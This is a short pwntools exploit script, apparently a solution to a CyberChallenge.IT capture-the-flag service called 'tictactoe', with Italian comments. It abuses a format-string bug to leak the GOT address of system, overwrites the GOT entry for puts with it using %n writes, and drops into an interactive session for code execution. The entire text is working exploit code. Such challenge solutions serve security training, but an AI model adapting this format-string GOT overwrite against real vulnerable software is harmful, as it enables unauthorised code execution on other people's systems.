from pwn import *

HOST = "tictactoe.challs.cyberchallenge.it"
PORT = 9132

p = remote(HOST, PORT)
def write(p, addr_to_overwrite_with, addr_to_overwrite):
    payload = p32(addr_to_overwrite) + b"%15$" + str(addr_to_overwrite_with - 4).encode() + b"A%15$n\n"
    p.sendline (payload)

def find_system_addr(p, addr):
    payload = p32(addr) + b"addr: %15$s\n"
    p.sendline (payload)
    p.recvuntil("addr: ")
    system_addr = p.recvline()[:4]
    return system_addr

system = 0x0804a2a4 # indirizzo di system in GOT
puts = 0x0804a2a0
# indirizzo di puts in GOT
sys_addr = find_system_addr(p, system)
sys_addr_part_1 = int.from_bytes(sys_addr[:2], byteorder='little')
sys_addr_part_2 = int.from_bytes(sys_addr[2:], byteorder='little')

write(p, sys_addr_part_1, puts)
write(p, sys_addr_part_2, puts + 2)
p.interactive()